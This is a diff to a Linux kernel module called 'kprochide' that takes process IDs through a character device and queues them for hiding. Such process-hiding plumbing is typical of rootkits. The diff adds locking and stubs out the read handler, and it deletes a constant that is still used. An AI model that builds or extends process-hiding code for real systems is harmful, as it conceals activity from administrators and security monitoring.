@@ -3,7 +3,8 @@
 #include <linux/fs.h>
 #include <linux/slab.h>
 
-#define DECIMAL_BASE (10)
+// mutex for accessing the list of processes to hide
+DEFINE_MUTEX(kprochide_pids_to_hide_mutex);
 
 static int device_open_count = 0;
 
@@ -31,7 +32,7 @@ void unregister_readpid_chrdev(int major_num, const char* device_name)
     unregister_chrdev(major_num, device_name);
 }
 
-static ssize_t device_write(struct file *fs, const char*buffer, size_t len, loff_t *offset)
+static ssize_t device_write(struct file *fs, const char *buffer, size_t len, loff_t *offset)
 {
     int pid_as_int = 0;
     int conversion_result = kstrtoint(buffer, DECIMAL_BASE, &pid_as_int);
@@ -39,7 +40,6 @@ static ssize_t device_write(struct file *fs, const char*buffer, size_t len, loff
         printk(KERN_DEBUG "kprochide: failed to convert buffer to pid_t.\n");
         return -EIO;
     }
-
     pid_t pid = (pid_t)pid_as_int;
 
     struct pid_to_hide *new_pid_to_hide = (struct pid_to_hide*)kmalloc(sizeof(struct pid_to_hide), GFP_KERNEL);
@@ -47,10 +47,14 @@ static ssize_t device_write(struct file *fs, const char*buffer, size_t len, loff
         return -EIO;
     }
 
-    new_pid_to_hide->pid = pid; 
+    new_pid_to_hide->pid = pid;
+
+    mutex_lock(&kprochide_pids_to_hide_mutex);
     INIT_LIST_HEAD(&new_pid_to_hide->l_head);
     list_add_tail(&new_pid_to_hide->l_head, &kprochide_pids_to_hide);
-    printk(KERN_INFO "kprochide: received pid %d\n", pid);
+    mutex_unlock(&kprochide_pids_to_hide_mutex);
+
+    printk(KERN_INFO "kprochide: new PID to hide: %d\n", pid);
 
     return len;
 }
@@ -75,20 +79,6 @@ static int device_release(struct inode* inode, struct file* file)
 
 static ssize_t device_read(struct file *fs, char *buffer, size_t len, loff_t *offset)
 { 
-    struct list_head *pos = NULL;
-    struct list_head *tmp;
-    struct pid_to_hide *info = NULL;
-
-    list_for_each_safe(pos, tmp, &kprochide_pids_to_hide) {
-        info = list_entry(pos, struct pid_to_hide, l_head);
-        if (NULL == info) {
-            continue;
-        }
-
-        printk(KERN_INFO "info->pid_number=%d\n", info->pid);
-        list_del(pos);
-        kfree(info);
-    }
-
+    // not implemented
     return len;
 }
